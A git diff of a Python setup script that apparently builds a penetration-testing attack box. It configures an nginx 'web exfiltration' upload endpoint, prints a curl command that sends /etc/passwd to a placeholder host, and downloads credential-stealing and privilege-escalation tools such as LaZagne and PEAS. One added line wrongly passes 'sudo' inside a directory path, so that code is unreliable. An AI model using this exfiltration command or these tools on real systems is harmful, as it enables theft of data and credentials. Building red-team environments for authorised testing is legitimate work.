@@ -74,15 +74,13 @@ def nginx_config():
 	# Used to create an NGINX proxy for apache for web exfiltration 
 	os.system("sudo mkdir -p /var/www/uploads/Exfil")
 	os.system("sudo chown -R www-data:www-data /var/www/uploads/Exfil")
-	if os.path.exists('/etc/nginx/sites-available/'):
-		os.system("sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf")
-		os.system("sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/")
-		os.system("sudo systemctl restart nginx.service")
-		os.system("sudo rm /etc/nginx/sites-enabled/default")
-		print(colored("NGINX has been setup. To test the upload, try:\n","green"))
-		print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt", "green"))
-	else:
-		print(colored("Error with nginx proxy setup", "red"))
+	os.system("sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf")
+	os.system("sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/")
+	os.system("sudo systemctl restart nginx.service")
+	os.system("sudo rm /etc/nginx/sites-enabled/default")
+	# Usage
+	print(colored("NGINX has been setup. To test the upload, try:\n","green"))
+	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt", "green"))
 
 
 def env_setup():
@@ -131,14 +129,14 @@ def peas_download():
 	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEAS.bat'
 	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEASany.exe'
 	def grab_peas():
-		os.mkdir(f"/opt/PEAS")
-		os.system(f"wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x /opt/PEAS/linpeas.sh")
-		os.system(f"wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
-		os.system(f"wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")
+		os.mkdir(f"sudo /opt/PEAS")
+		os.system(f"sudo wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x /opt/PEAS/linpeas.sh")
+		os.system(f"sudo wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
+		os.system(f"sudo wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")
 	# For the time being - just scrub the PEAS directory and re-obtain
 	if os.path.exists("/opt/PEAS"):
 		#Lol, risky
-		os.system("rm -rf /opt/PEAS")
+		os.system("sudo rm -rf /opt/PEAS")
 		grab_peas()
 	else:
 		grab_peas()
@@ -163,9 +161,9 @@ def shell_creation():
 def tool_install():
 	#Temp method to grab lazagne and the old firefox decrypt for python2
 	lazagne_exe = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
-	os.system(f"wget {lazagne_exe} -qO /opt/lazagne.exe")
+	os.system(f"sudo wget {lazagne_exe} -qO /opt/lazagne.exe")
 	ff_decrypt_old = 'https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
-	os.system(f"wget {ff_decrypt_old} -qO /opt/FirefoxDecrypt_ForPython2")
+	os.system(f"sudo wget {ff_decrypt_old} -qO /opt/FirefoxDecrypt_ForPython2")
 	
 	#### END TEMP METHOD
 	
@@ -202,7 +200,7 @@ def tool_install():
 
 def sublime_download():
 	sublime = 'deb https://download.sublimetext.com/ apt/stable/'
-	os.system('wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
+	os.system('sudo wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
 				| sudo apt-key add -')
 	os.system(f'echo {sublime} | sudo tee /etc/apt/sources.list.d/sublime-text.list')
 
